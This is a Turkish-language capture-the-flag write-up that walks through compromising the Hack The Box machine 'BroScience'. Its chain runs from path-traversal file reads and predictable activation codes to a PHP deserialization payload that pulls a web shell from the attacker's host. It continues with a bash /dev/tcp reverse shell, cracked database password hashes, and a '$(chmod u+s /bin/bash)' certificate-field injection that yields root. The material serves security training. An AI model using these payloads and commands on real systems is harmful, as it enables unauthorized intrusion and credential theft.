---

title: 🟠 HTB - BroScience
author: Acivik
date: 2023-04-12 18:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, BroScience, walktrough, medium, linux]

---

![https://i.ibb.co/NKPDRGX/Bro-Science.png](https://i.ibb.co/NKPDRGX/Bro-Science.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

`nmap` ssh(22) ve http (80,443) olmak üzere 3 adet açık port bildirir.

```clojure
root@acivik:~/ctfs/BroScience-10.129.93.109# nmap 10.129.93.109 --min-rate 1000 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-08 05:05 EST
Nmap scan report for 10.129.93.109
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 68.55 seconds
root@acivik:~/ctfs/BroScience-10.129.93.109# nmap 10.129.93.109 -sVC -p22,80,443
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-08 05:07 EST
Nmap scan report for 10.129.93.109
Host is up (0.16s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: BroScience : Home
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.74 seconds
root@acivik:~/ctfs/BroScience-10.129.93.109#
```

Apache ve OpenSSH’a göre hedef makine üzerinde muhtemelen `Debian 11 Bullseye` çalışıyor.

80 http portu 443 https portuna yani `https://broscience.htb/` adresine yönlendirir. `/etc/hosts` dosyasına bunu ekleyeceğim.

# <span style="color:#AA0E1C"><b># Enumeration</b></span>

## <span style="color:#0096FF">Web Sitesi - broscience.htb</span>

![https://i.ibb.co/D5kvmgH/image.png](https://i.ibb.co/D5kvmgH/image.png)

Kaynak kodlarına baktım.

![Untitled](BroScience%20de3b6e2c743c4356b7f6c0f800a2f1a3/Untitled.png)

id parametresini kullanarak kullanıcılar hakkında bilgi toplayabilirim.

```bash
root@acivik:~/ctfs/BroScience-10.129.93.109# wfuzz -c -z range,0-100 -u https://broscience.htb/user.php?id=FUZZ --hh 1313

000000006:   200        45 L     98 W       1969 Ch     "5"                                                                                                        
000000002:   200        45 L     98 W       1992 Ch     "1"                                                                                                        
000000003:   200        45 L     98 W       1964 Ch     "2"                                                                                                        
000000005:   200        45 L     98 W       1963 Ch     "4"                                                                                                        
000000004:   200        45 L     98 W       1973 Ch     "3"                                                                                                        
000000001:   200        28 L     70 W       1307 Ch     "0"
```

`/user.php?id=2`

![https://i.ibb.co/VtLDt6r/image.png](https://i.ibb.co/VtLDt6r/image.png)

Fazla bir bilgi ifşası yok.

### <span style="color:#FFC300">Directory Brute Force</span>

```bash
root@acivik:~/ctfs/BroScience-10.129.93.109# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u https://broscience.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://broscience.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 161ms]
includes                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 162ms]
styles                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 168ms]
javascript              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 160ms]
manual                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 161ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 222ms]
```

includes dizini altında ilginç dosyalar var gibi.

![https://i.ibb.co/Y26q0H5/image.png](https://i.ibb.co/Y26q0H5/image.png)

`/includes/img.php` dosyasına baktığımda `Error: Missing 'path' parameter.` yanıtı aldım.

Path parametresi ile biraz uğraşmak istiyorum. `?path=../../../../../../etc/passwd` isteğini gönderdiğimde `Error: Attack detected.` yanıtını aldım.

# <span style="color:#AA0E1C"><b># FootHold - Shell as www-data</b>

Yüksek olasılıkta LFI zafiyetinin olduğunu düşünüyorum. Test etmek için `BurpSuite` kullanacağım.

![https://i.ibb.co/t4Gyv6Q/image.png](https://i.ibb.co/t4Gyv6Q/image.png)

Zafiyetin varlığını doğrulamış oldum.

Web Sitesi üzerinde bulduğum tüm dosyalar şu şekildedir.

```
user.php
login.php
index.php
register.php
logout.php
comment.php
activate.php
exercise.php
update_user.php
includes/db_connect.php
includes/header.php
includes/img.php
includes/navbar.php
includes/utils.php
```

LFI zafiyetini kullanarak bu dosyaları inceleyeceğim. İlginç bir şey bulabileceğime inanıyorum.

`db_connect.php` 

```php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";
```

`register.php`

```php
// Create the account
include_once 'includes/utils.php';
$activation_code = generate_activation_code();
$res = pg_prepare($db_conn, "check_code_unique_query", 'SELECT id FROM users WHERE activation_code = $1');
$res = pg_execute($db_conn, "check_code_unique_query", array($activation_code));

if (pg_num_rows($res) == 0) {
    $res = pg_prepare($db_conn, "create_user_query", 'INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)');
    $res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));

    // TODO: Send the activation link to email
    $activation_link = "https://broscience.htb/activate.php?code={$activation_code}";

    $alert = "Account created. Please check your email for the activation link.";
    $alert_type = "success";
```

Hesap oluşturulduğunda bir aktivasyon kodu oluşturuluyor. Hesabı doğrulamak için `https://broscience.htb/activate.php?code={$activation_code}` bu adrese doğru kodu girmemiz gerekiyor.

Kod nasıl oluşturuluyor ona bakacağım.

`includes/utils.php`

```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

`time()` ile sözde rastgele bir değer oluşturuyor. 

Sunucudan dönen response header’ında zaman bilgisini görebilirim. Öylesine bir request gönderdim ve sunucunun zaman değerini aldım. Sonrasında aşağıdaki kod ile activation kodları ürettim.

```php
<?php

function generate_activation_code($time) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand($time);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

$svrtime = date(strtotime("Mon, 09 Jan 2023 00:37:42 GMT"))-100;
$a = 0;
while ($a <= 500){
	$a++;
	$svrtime++;
	echo generate_activation_code($svrtime)."\n";
}
?>
```

Ürettiğim aktivasyon kodları ile brute-force yapacağım.

```bash
root@acivik:~/ctfs/BroScience-10.129.93.109# php generator.php > activate.txt
root@acivik:~/ctfs/BroScience-10.129.93.109# ffuf -w activate.txt -u https://broscience.htb/activate.php?code=FUZZ -fs 1256

-> NsscBOJGera5O4Mw4AU8g7PR4oR0MoGU [Status: 200, Size: 1258, Words: 293, Lines: 28, Duration: 184ms]

```

Kullanıyı aktif ettim.

![https://i.ibb.co/C2k1VgZ/image.png](https://i.ibb.co/C2k1VgZ/image.png)

LFI ile dosyaları okumaya devam ediyorum.

```php
class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
		$this->theme = $theme;
    }
}

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
```

Bu fonksiyon kullanıcının tercih ettiği temayı ayarlamak için kullanılır. Kullanıcı oturum açmışsa tercihlerinin bulunduğu `user-prefs` adında base64 ile kodlanmış bir cookie değeri alır. Kullanıcı zaten bu cookie bilgisine sahipse base64 kod çözülür ve tercih edilen tema değeri döndürülür. 

Dosyanın altına doğru bir Avatar sınıfı var.

```php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>
```

Avatar class, kullanıcının avatarını önce geçici olarak belirlemesine ve sonrasında kalıcı olarak kaydetmesini sağlar. Nesne unserialize edildiğinde `__wakeup()` magic methodu çağrılır ve avatar nesnesi oluşturulur. Ardından kaydedilir.

`$tmp` ve `$imgPath` değerlerini değiştireceğim. Sonrasında serialize ederek base64 ile kodlayacağım.

`file_get_contents` fonksiyonu `$tmp` değerini alır. Buraya bir web shell eklemeye çalışacağım.

```php
<?php
class Avatar {
    public $imgPath; 

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = "http://10.10.14.54/phpcmd.php";
    public $imgPath = "/var/www/html/images/phpcmd.php";

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
echo base64_encode(serialize(new AvatarInterface))."\n";

?>
```

php ile çalıştırdım ve çıktı aldım.

```bash
root@acivik:~/ctfs/BroScience-10.129.93.109# php seri2.php 
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyOToiaHR0cDovLzEwLjEwLjE0LjU0L3BocGNtZC5waHAiO3M6NzoiaW1nUGF0aCI7czozMToiL3Zhci93d3cvaHRtbC9pbWFnZXMvcGhwY21kLnBocCI7fQ==
```

Bu değeri cookie değeri ile değiştireceğim.

```bash
root@acivik:~/ctfs/BroScience-10.129.93.109# python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.94.146 - - [09/Jan/2023 12:27:53] "GET /phpcmd.php HTTP/1.0" 200 -
10.129.94.146 - - [09/Jan/2023 12:27:53] "GET /phpcmd.php HTTP/1.0" 200 -
10.129.94.146 - - [09/Jan/2023 12:27:54] "GET /phpcmd.php HTTP/1.0" 200 -
```

Dosyayı aldığını görebilirim.

![https://i.ibb.co/3Tmqsk6/image.png](https://i.ibb.co/3Tmqsk6/image.png)

Reverse shell alacağım.

```bash
root@acivik:~/ctfs/BroScience-10.129.93.109# echo "bash -i &>/dev/tcp/10.10.14.54/9001 <&1" | base64 
YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjU0LzkwMDEgPCYxCg==

--> https://broscience.htb/images/phpcmd.php?cmd=echo "YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjU0LzkwMDEgPCYxCg==" | base64 -d | bash

root@acivik:~/ctfs/BroScience-10.129.93.109# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.94.146] 51776
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
www-data@broscience:/var/www/html/images$
```

# <span style="color:#AA0E1C"><b># PrivEsc: www-data → bill</b></span>

```bash
www-data@broscience:/var/www/html$ netstat -tnulp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:36559           0.0.0.0:*                           -                   
udp6       0      0 :::5353                 :::*                                -                   
udp6       0      0 :::51584                :::*                                -
```

Dinlenen portlara baktığımda 5432 üzerinde postgresql’in çalıştığını görüyorum. Sunucu tarafında psql komudu bulunmuyor bu yüzden port forwarding yapacağım.

```bash
kali -> chisel server -p 8000 --reverse

target -> ./chisel client 10.10.14.54:8000 R:54321:127.0.0.1:5432
```

Daha önceden elde ettiğim credentials’ı burada kullanacağım.

```bash
root@acivik:~# psql -U dbuser -W -h localhost -p 54321 -d broscience
Password: 
psql (15.1 (Debian 15.1-1), server 13.9 (Debian 13.9-0+deb11u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

broscience=>
```

```bash
broscience=> \dt
           List of relations
 Schema |   Name    | Type  |  Owner   
--------+-----------+-------+----------
 public | comments  | table | postgres
 public | exercises | table | postgres
 public | users     | table | postgres
(3 rows)

broscience=> select username,password from users;
   username    |             password             
---------------+----------------------------------
 administrator | 15657792073e8a843d4f91fc403454e1
 bill          | 13edad4932da9dbb57d9cd15b66ed104
 michael       | bd3dad50e2d578ecba87d5fa15ca5f85
 john          | a7eed23a7be6fe0d765197b1027453fe
 dmytro        | 5d15340bded5b9395d5d14b9c21bc82b
(5 rows)
```

Hashcat kullanarak hashleri kırmayı deniyorum.

```bash
root@acivik:~/ctfs/BroScience-10.129.93.109# hashcat -m 20 -a 0 creds.txt /usr/share/wordlists/rockyou.txt --show
13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest
```

Bill kullanıcısına ssh ile bağlanabilirim.

```bash
root@acivik:~/ctfs/BroScience-10.129.93.109# sshpass -p 'iluvhorsesandgym' ssh bill@broscience.htb
Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan  2 04:45:21 2023 from 10.10.14.40
bill@broscience:~$
```

# <span style="color:#AA0E1C"><b># PrivEsc: bill → root</b></span>

`pspy` ile processler incelenir.

```bash
2023/01/09 05:12:06 CMD: UID=0     PID=298412 | /usr/sbin/CRON -f 
2023/01/09 05:12:06 CMD: UID=0     PID=298413 | /bin/sh -c /root/cron.sh 
2023/01/09 05:12:06 CMD: UID=0     PID=298414 | /bin/bash /root/cron.sh 
2023/01/09 05:12:06 CMD: UID=0     PID=298415 | /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt 
2023/01/09 05:12:06 CMD: UID=0     PID=298416 | 
2023/01/09 05:12:06 CMD: UID=0     PID=298417 | /bin/bash /root/cron.sh
```

Buradan anlaşılıyor ki root kullanıcısı `/opt/renew_cert.sh /home/bill/Certs/broscience.crt` komutunu düzenli olarak çalıştırır.

Script ile olarak parametreyi kontrol eder.

```bash
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi
```

Belirtilen sertifakanın süresini kontrol eder. Ona göre yenilenmesi gerekiyorsa devam eder.

```bash
echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```

Alınan değişkenler ile yeni bir sertifika oluşturur. Burada `$commonName` değişkenine command injection uygulanabilir.

```bash
bill@broscience:/opt$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /dev/null -out /home/bill/Certs/broscience.crt -days 1
Generating a RSA private key
...++++
.......................................................................++++
writing new private key to '/dev/null'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:TR
State or Province Name (full name) [Some-State]:test
Locality Name (eg, city) []:test
Organization Name (eg, company) [Internet Widgits Pty Ltd]:testtest
Organizational Unit Name (eg, section) []:tetest
Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)
Email Address []:a@a.com           
bill@broscience:/opt$
```

Bir süre bekledikten sonra bash dosyasının yetkilerini kontrol edeceğim.

```bash
bill@broscience:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
bill@broscience:/tmp$ bash -p
bash-5.1# whoami
root
bash-5.1# id
uid=1000(bill) gid=1000(bill) euid=0(root) groups=1000(bill)
bash-5.1#
```

That’s all
